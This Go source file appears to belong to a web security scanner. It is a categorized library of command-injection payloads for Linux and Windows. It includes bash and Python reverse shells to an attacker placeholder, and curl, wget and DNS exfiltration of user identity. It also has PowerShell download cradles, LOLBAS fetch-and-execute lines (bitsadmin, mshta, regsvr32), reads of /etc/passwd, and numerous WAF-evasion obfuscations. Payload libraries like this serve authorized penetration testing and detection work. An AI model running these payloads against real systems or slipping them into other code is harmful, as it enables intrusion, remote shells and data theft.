// Package cmdi provides Command Injection payloads.
// Payloads are categorized by:
//   - Platform (Linux, Windows, Both)
//   - Injection type (Direct, Chained, Time-based)
//   - Evasion technique
package cmdi

// Platform represents the target platform.
type Platform string

const (
	PlatformLinux   Platform = "linux"
	PlatformWindows Platform = "windows"
	PlatformBoth    Platform = "both"
)

// InjectionType represents the injection technique.
type InjectionType string

const (
	TypeDirect    InjectionType = "direct"
	TypeChained   InjectionType = "chained"
	TypeTimeBased InjectionType = "time"
	TypeBlind     InjectionType = "blind"
)

// Payload represents a command injection payload.
type Payload struct {
	Value       string
	Platform    Platform
	Type        InjectionType
	Description string
	WAFBypass   bool
}

// GetPayloads returns payloads for a specific platform.
func GetPayloads(platform Platform) []Payload {
	switch platform {
	case PlatformLinux:
		return linuxPayloads
	case PlatformWindows:
		return windowsPayloads
	default:
		return bothPayloads
	}
}

// GetByType returns payloads filtered by injection type.
func GetByType(platform Platform, injType InjectionType) []Payload {
	all := GetPayloads(platform)
	var result []Payload
	for _, p := range all {
		if p.Type == injType {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads with bypass techniques.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all command injection payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, bothPayloads...)
	all = append(all, linuxPayloads...)
	all = append(all, windowsPayloads...)
	all = append(all, linuxBlindPayloads...)
	all = append(all, linuxOOBPayloads...)
	all = append(all, linuxBypassPayloads...)
	all = append(all, shellshockPayloads...)
	return all
}

// Universal payloads that work on both platforms.
// Source: PayloadsAllTheThings, HackTricks
var bothPayloads = []Payload{
	// Basic command separators
	{Value: ";id", Platform: PlatformBoth, Type: TypeChained, Description: "Semicolon separator"},
	{Value: "|id", Platform: PlatformBoth, Type: TypeChained, Description: "Pipe separator"},
	{Value: "||id", Platform: PlatformBoth, Type: TypeChained, Description: "OR operator"},
	{Value: "&id", Platform: PlatformBoth, Type: TypeChained, Description: "Background operator"},
	{Value: "&&id", Platform: PlatformBoth, Type: TypeChained, Description: "AND operator"},

	// Newline separators
	{Value: "\nid", Platform: PlatformBoth, Type: TypeChained, Description: "Newline separator"},
	{Value: "\r\nid", Platform: PlatformBoth, Type: TypeChained, Description: "CRLF separator"},
	{Value: "%0aid", Platform: PlatformBoth, Type: TypeChained, Description: "URL encoded newline"},
	{Value: "%0d%0aid", Platform: PlatformBoth, Type: TypeChained, Description: "URL encoded CRLF"},

	// Backtick/subshell
	{Value: "`id`", Platform: PlatformBoth, Type: TypeDirect, Description: "Backtick substitution"},
	{Value: "$(id)", Platform: PlatformBoth, Type: TypeDirect, Description: "Dollar substitution"},

	// With quoted strings
	{Value: "\";id;#", Platform: PlatformBoth, Type: TypeChained, Description: "Break double quote"},
	{Value: "';id;#", Platform: PlatformBoth, Type: TypeChained, Description: "Break single quote"},
	{Value: "$(id)\"", Platform: PlatformBoth, Type: TypeDirect, Description: "Substitution in quote"},
}

// Linux-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var linuxPayloads = []Payload{
	// Basic identification
	{Value: ";id", Platform: PlatformLinux, Type: TypeChained, Description: "id command"},
	{Value: ";whoami", Platform: PlatformLinux, Type: TypeChained, Description: "whoami command"},
	{Value: ";uname -a", Platform: PlatformLinux, Type: TypeChained, Description: "uname command"},
	{Value: ";cat /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Read passwd"},
	{Value: ";ls -la", Platform: PlatformLinux, Type: TypeChained, Description: "List files"},

	// Time-based blind
	{Value: ";sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Sleep 5 seconds"},
	{Value: "|sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Pipe sleep"},
	{Value: "&&sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "AND sleep"},
	{Value: "||sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "OR sleep"},
	{Value: "`sleep 5`", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Backtick sleep"},
	{Value: "$(sleep 5)", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Subshell sleep"},

	// Reverse shells (for OOB testing)
	{Value: ";bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", Platform: PlatformLinux, Type: TypeBlind, Description: "Bash reverse shell"},
	{Value: ";curl http://ATTACKER_IP/$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "Curl exfiltration"},
	{Value: ";wget http://ATTACKER_IP/$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "Wget exfiltration"},
	{Value: ";ping -c 1 ATTACKER_IP", Platform: PlatformLinux, Type: TypeBlind, Description: "Ping callback"},
	{Value: ";nslookup $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "DNS exfiltration"},

	// WAF bypass Linux
	{Value: ";c'a't /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Quote bypass cat", WAFBypass: true},
	{Value: ";c\"a\"t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Double quote bypass", WAFBypass: true},
	{Value: ";c\\at /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Backslash bypass", WAFBypass: true},
	{Value: ";/???/??t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Wildcard bypass cat", WAFBypass: true},
	{Value: ";/???/b??/?at /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Wildcard path bypass", WAFBypass: true},
	{Value: ";cat$IFS/etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "IFS bypass spaces", WAFBypass: true},
	{Value: ";{cat,/etc/passwd}", Platform: PlatformLinux, Type: TypeChained, Description: "Brace expansion", WAFBypass: true},
	{Value: ";X=$'cat\\x20/etc/passwd'&&$X", Platform: PlatformLinux, Type: TypeChained, Description: "Hex in variable", WAFBypass: true},
	{Value: ";w]h]o]a]m]i", Platform: PlatformLinux, Type: TypeChained, Description: "Bracket insertion", WAFBypass: true},
	{Value: ";$(tr '[a-z]' '[A-Z]'<<<whoami)", Platform: PlatformLinux, Type: TypeDirect, Description: "tr case conversion", WAFBypass: true},
	{Value: ";$(echo 'd2hvYW1p'|base64 -d)", Platform: PlatformLinux, Type: TypeDirect, Description: "Base64 bypass", WAFBypass: true},
	{Value: ";$(xxd -r -p<<<77686f616d69)", Platform: PlatformLinux, Type: TypeDirect, Description: "Hex decode bypass", WAFBypass: true},

	// Without spaces
	{Value: ";cat${IFS}/etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "IFS variable", WAFBypass: true},
	{Value: ";cat</etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Input redirect", WAFBypass: true},
	{Value: ";IFS=,;`cat<<<cat,/etc/passwd`", Platform: PlatformLinux, Type: TypeChained, Description: "Custom IFS", WAFBypass: true},
}

// Windows-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var windowsPayloads = []Payload{
	// Basic identification
	{Value: "&whoami", Platform: PlatformWindows, Type: TypeChained, Description: "whoami command"},
	{Value: "|whoami", Platform: PlatformWindows, Type: TypeChained, Description: "Pipe whoami"},
	{Value: "||whoami", Platform: PlatformWindows, Type: TypeChained, Description: "OR whoami"},
	{Value: "&&whoami", Platform: PlatformWindows, Type: TypeChained, Description: "AND whoami"},
	{Value: "&hostname", Platform: PlatformWindows, Type: TypeChained, Description: "hostname command"},
	{Value: "&ipconfig", Platform: PlatformWindows, Type: TypeChained, Description: "ipconfig command"},
	{Value: "&dir", Platform: PlatformWindows, Type: TypeChained, Description: "dir command"},
	{Value: "&type C:\\Windows\\win.ini", Platform: PlatformWindows, Type: TypeChained, Description: "Read win.ini"},

	// Time-based blind
	{Value: "&ping -n 5 127.0.0.1", Platform: PlatformWindows, Type: TypeTimeBased, Description: "Ping delay 5s"},
	{Value: "|ping -n 5 127.0.0.1", Platform: PlatformWindows, Type: TypeTimeBased, Description: "Pipe ping delay"},
	{Value: "&&timeout /t 5", Platform: PlatformWindows, Type: TypeTimeBased, Description: "Timeout delay"},
	{Value: "&ping -n 10 127.0.0.1", Platform: PlatformWindows, Type: TypeTimeBased, Description: "Ping delay 10s"},

	// PowerShell
	{Value: "&powershell -c \"whoami\"", Platform: PlatformWindows, Type: TypeChained, Description: "PowerShell whoami"},
	{Value: "&powershell IEX(whoami)", Platform: PlatformWindows, Type: TypeChained, Description: "PowerShell IEX"},
	{Value: "&powershell Start-Sleep -s 5", Platform: PlatformWindows, Type: TypeTimeBased, Description: "PowerShell sleep"},

	// WAF bypass Windows
	{Value: "&w^h^o^a^m^i", Platform: PlatformWindows, Type: TypeChained, Description: "Caret bypass", WAFBypass: true},
	{Value: "&\"whoami\"", Platform: PlatformWindows, Type: TypeChained, Description: "Quoted command", WAFBypass: true},
	{Value: "&(whoami)", Platform: PlatformWindows, Type: TypeChained, Description: "Parenthesis wrap", WAFBypass: true},
	{Value: "&set x=who&& set y=ami&& %x%%y%", Platform: PlatformWindows, Type: TypeChained, Description: "Variable concat", WAFBypass: true},
	{Value: "&cmd /c whoami", Platform: PlatformWindows, Type: TypeChained, Description: "Explicit cmd", WAFBypass: true},
	{Value: "&cmd.exe /c whoami", Platform: PlatformWindows, Type: TypeChained, Description: "Full cmd path", WAFBypass: true},
	{Value: "&%COMSPEC% /c whoami", Platform: PlatformWindows, Type: TypeChained, Description: "COMSPEC variable", WAFBypass: true},

	// OOB testing Windows
	{Value: "&nslookup %USERNAME%.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "DNS exfil username"},
	{Value: "&powershell Invoke-WebRequest http://ATTACKER_IP/$env:USERNAME", Platform: PlatformWindows, Type: TypeBlind, Description: "PS HTTP exfil"},
	{Value: "&certutil -urlcache -f http://ATTACKER_IP/test test.txt", Platform: PlatformWindows, Type: TypeBlind, Description: "Certutil callback"},

	// --- HackTricks LOLBAS expansion ---
	{Value: "&bitsadmin /transfer myJob /download /priority normal http://ATTACKER_IP/x.exe %TEMP%\\x.exe", Platform: PlatformWindows, Type: TypeBlind, Description: "bitsadmin file fetch (LOLBAS)"},
	{Value: "&mshta http://ATTACKER_IP/x.hta", Platform: PlatformWindows, Type: TypeBlind, Description: "mshta HTA execution"},
	{Value: "&regsvr32 /s /u /n /i:http://ATTACKER_IP/x.sct scrobj.dll", Platform: PlatformWindows, Type: TypeBlind, Description: "regsvr32 squiblydoo"},
	{Value: "&rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\");", Platform: PlatformWindows, Type: TypeBlind, Description: "rundll32 JS RCE"},
	{Value: "&powershell -enc dwBoAG8AYQBtAGkA", Platform: PlatformWindows, Type: TypeChained, Description: "PowerShell base64-encoded command", WAFBypass: true},
	{Value: "&powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/x.ps1')\"", Platform: PlatformWindows, Type: TypeBlind, Description: "PowerShell download cradle"},
	{Value: "&for /f %i in ('whoami') do nslookup %i.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "for-loop DNS exfil result"},
}

// --- HackTricks / PayloadAllTheThings advanced expansion ---

// Time-based blind (Linux) — language-interpreter delays the existing
// table doesn't cover, plus CPU-burn fallback for busybox containers
// without sleep.
var linuxBlindPayloads = []Payload{
	{Value: "%0Asleep%205", Platform: PlatformLinux, Type: TypeTimeBased, Description: "URL-encoded newline sleep", WAFBypass: true},
	{Value: ";python -c 'import time;time.sleep(5)'", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Python sleep"},
	{Value: ";perl -e 'sleep(5)'", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Perl sleep"},
	{Value: ";dd if=/dev/zero bs=1M count=512|md5sum", Platform: PlatformLinux, Type: TypeTimeBased, Description: "CPU-burn fallback (busybox)"},
}

// OOB exfil (Linux) — DNS-based exfil works through outbound-restricted
// networks because DNS resolution traverses different paths than HTTP.
// ATTACKER_DOMAIN is a placeholder the detector substitutes before
// sending.
var linuxOOBPayloads = []Payload{
	{Value: ";nslookup -type=A $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "DNS A-record exfil whoami"},
	{Value: ";dig $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "dig DNS exfil"},
	{Value: ";host $(id|base64).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "host base64-id exfil"},
	{Value: ";curl http://ATTACKER_DOMAIN/?u=$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "curl query-param exfil"},
	{Value: ";wget http://ATTACKER_DOMAIN/$(id|base64)", Platform: PlatformLinux, Type: TypeBlind, Description: "wget exfil"},
	{Value: ";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", Platform: PlatformLinux, Type: TypeBlind, Description: "Bash reverse shell"},
	{Value: ";python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'", Platform: PlatformLinux, Type: TypeBlind, Description: "Python reverse shell"},
}

// Modern bash WAF bypass — brace expansion, ANSI-C quoting,
// process-substitution tricks documented on HackTricks's
// "Bypass linux restrictions" page.
var linuxBypassPayloads = []Payload{
	{Value: ";{whoami,;id}", Platform: PlatformLinux, Type: TypeChained, Description: "Brace-expanded sequence (no space)", WAFBypass: true},
	{Value: ";cat$'\\x20'/etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "ANSI-C quoting space", WAFBypass: true},
	{Value: ";cat<(echo /etc/passwd)", Platform: PlatformLinux, Type: TypeChained, Description: "Process substitution", WAFBypass: true},
	{Value: ";c\"\"a\"\"t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Empty-quote concat", WAFBypass: true},
	{Value: ";c''a''t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Empty single-quote concat", WAFBypass: true},
	{Value: ";\\c\\a\\t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Backslash-prefixed letters", WAFBypass: true},
	{Value: ";$0<<<id", Platform: PlatformLinux, Type: TypeDirect, Description: "$0 (shell name) here-string", WAFBypass: true},
	{Value: ";bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash", Platform: PlatformLinux, Type: TypeDirect, Description: "Brace-expanded base64 pipe", WAFBypass: true},
}
